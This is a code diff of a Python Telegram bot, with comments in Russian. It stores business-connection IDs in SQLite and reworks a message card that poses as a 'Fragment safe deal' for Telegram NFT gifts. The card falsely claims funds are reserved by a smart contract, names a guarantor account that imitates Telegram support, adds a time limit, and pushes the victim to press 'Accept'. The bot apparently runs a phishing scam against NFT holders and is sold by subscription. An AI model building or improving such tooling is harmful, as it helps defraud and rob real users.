@@ -42,6 +42,11 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
+        # Таблица для Business подключений (чтобы conn_id не терялся)
+        conn.execute("""CREATE TABLE IF NOT EXISTS business_conns (
+            user_id INTEGER PRIMARY KEY, conn_id TEXT
+        )""")
+        
         conn.execute("""CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
             sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
@@ -80,8 +85,6 @@ NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
 CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
 KEY_RE = re.compile(r"^(TG-[A-Z0-9]{6})$", re.I)
-
-BUSINESS_CONNS = {}
 
 def parse_nft(url: str):
     m = NFT_RE.search(url)
@@ -135,7 +138,9 @@ async def delete_code_message(bot_instance: Bot, chat_id: int, msg_id: int, conn
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
-    BUSINESS_CONNS[conn.user.id] = conn.id
+    with get_db() as db_conn:
+        db_conn.execute("INSERT OR REPLACE INTO business_conns (user_id, conn_id) VALUES (?, ?)", 
+                        (conn.user.id, conn.id))
     log.info(f"✅ Business: user={conn.user.id} id={conn.id}")
 
 # ==========================================
@@ -347,7 +352,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (ФИКС)
+# ОТПРАВКА ОФФЕРА (ССЫЛКА СВЕРХУ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -367,10 +372,14 @@ async def handle_business_message(msg: Message):
         log.error("❌ Чужой отправитель")
         return
 
-    conn_id = BUSINESS_CONNS.get(msg.from_user.id)
-    if not conn_id: 
-        log.error("❌ Нет conn_id")
+    with get_db() as conn:
+        row = conn.execute("SELECT conn_id FROM business_conns WHERE user_id=?", (msg.from_user.id,)).fetchone()
+    
+    if not row: 
+        log.error("❌ Нет conn_id в базе данных")
         return
+    
+    conn_id = row["conn_id"]
 
     await delete_code_message(msg.bot, msg.chat.id, msg.message_id, conn_id)
     await asyncio.sleep(1.5)
@@ -378,7 +387,9 @@ async def handle_business_message(msg: Message):
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
+    # ССЫЛКА НА NFT В САМОМ НАЧАЛЕ (картинка подтянется сверху)
     card_text = (
+        f"{nft_link}\n\n" 
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"<b>Уведомление о зарезервированной сделке</b>\n\n"
@@ -386,8 +397,7 @@ async def handle_business_message(msg: Message):
         f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
-        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f"{nft_link}"
+        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
